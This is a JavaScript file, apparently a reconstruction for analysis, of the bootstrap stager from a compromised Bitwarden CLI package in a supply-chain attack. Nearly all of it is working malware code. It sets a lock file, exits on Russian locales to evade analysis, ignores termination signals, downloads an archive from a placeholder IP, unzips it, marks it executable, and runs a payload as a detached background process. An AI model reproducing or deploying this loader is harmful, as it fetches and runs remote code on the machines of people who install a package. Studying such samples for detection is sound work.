// Reconstruction of bw_setup.js — the Node bootstrap stager from
// @bitwarden/cli@2026.4.0 (Shai-Hulud: The Third Coming, April 22 2026).
// Pattern from Endor Labs report + N3mes1s gist:
//   - downloads Bun 1.3.13 from github.com/oven-sh/bun/releases
//   - chmod +x and runs bw1.js with bun (detached + stdio:ignore)
//   - skips on Russian locale (anti-analysis)
//   - acquires a lock at $TMPDIR/tmp.987654321.lock to prevent re-entry
//   - ignores SIGINT/SIGTERM to resist interruption
//   - sets __DAEMONIZED=1 marker
// Real download URL replaced with a TEST-NET-3 dummy. Real lock filename kept.
const https = require('https');
const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');
const os = require('os');

const TMP = os.tmpdir();
const LOCK = path.join(TMP, 'tmp.987654321.lock');
if (fs.existsSync(LOCK)) process.exit(0);
try { fs.writeFileSync(LOCK, String(process.pid)); } catch {}

// Locale kill switch — skip Russian environments
const locale = process.env.LC_ALL || process.env.LC_MESSAGES || process.env.LANGUAGE || process.env.LANG || '';
if (/^ru/i.test(locale)) process.exit(0);

// Signal handlers to resist interruption
process.on('SIGINT', () => {});
process.on('SIGTERM', () => {});

// Pretend to download Bun (real URL pattern replaced with documentation domain)
const plat = process.platform === 'darwin' ? 'darwin-x64'
           : process.platform === 'win32' ? 'windows-x64'
           : 'linux-x64';
const BUN_URL = 'https://203.0.113.43/oven-sh/bun/releases/download/bun-v1.3.13/bun-' + plat + '.zip';
const bunZip = path.join(TMP, 'bun.zip');

function download(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  const req = https.get(url, (res) => {
    res.pipe(file);
    file.on('finish', () => file.close(cb));
  });
  req.on('error', () => { try { file.close(); } catch {}; });
}

download(BUN_URL, bunZip, () => {
  try {
    execSync('unzip -o "' + bunZip + '" -d "' + TMP + '"');
  } catch {}
  const bunBin = path.join(TMP, 'bun-' + plat, 'bun');
  try { fs.chmodSync(bunBin, 0o755); } catch {}

  // Daemonize and run bw1.js with Bun
  const child = spawn(bunBin, [path.join(__dirname, 'bw1.js')], {
    detached: true,
    stdio: 'ignore',
    env: Object.assign({}, process.env, { __DAEMONIZED: '1' })
  });
  child.unref();
});
